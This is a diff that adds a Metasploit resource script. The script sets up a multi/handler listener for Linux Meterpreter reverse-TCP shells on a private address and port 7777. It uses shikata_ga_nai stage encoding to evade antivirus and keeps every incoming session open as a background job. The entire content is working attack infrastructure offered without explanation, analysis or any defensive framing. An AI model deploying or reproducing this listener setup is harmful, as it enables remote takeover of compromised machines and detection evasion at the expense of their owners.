@@ -1,0 +1,8 @@
+use exploit/multi/handler
+set PAYLOAD linux/meterpreter/reverse_tcp
+set LHOST 192.168.119.129
+set LPORT 7777
+set EnableStageEncoding true
+set StageEncoder x86/shikata_ga_nai
+set ExitOnSession false
+exploit -j -z
